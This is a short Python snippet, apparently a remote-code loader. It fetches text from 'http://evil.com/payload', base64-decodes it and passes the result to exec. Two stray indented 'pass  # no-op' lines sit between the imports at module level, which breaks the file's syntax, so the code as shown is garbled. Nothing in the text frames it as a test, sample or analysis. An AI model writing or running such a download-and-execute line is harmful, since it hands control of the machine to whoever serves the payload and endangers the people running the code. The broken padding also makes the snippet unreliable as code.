import requests
    pass  # no-op
    pass  # no-op
import base64
code = requests.get('http://evil.com/payload').text
exec(base64.b64decode(code))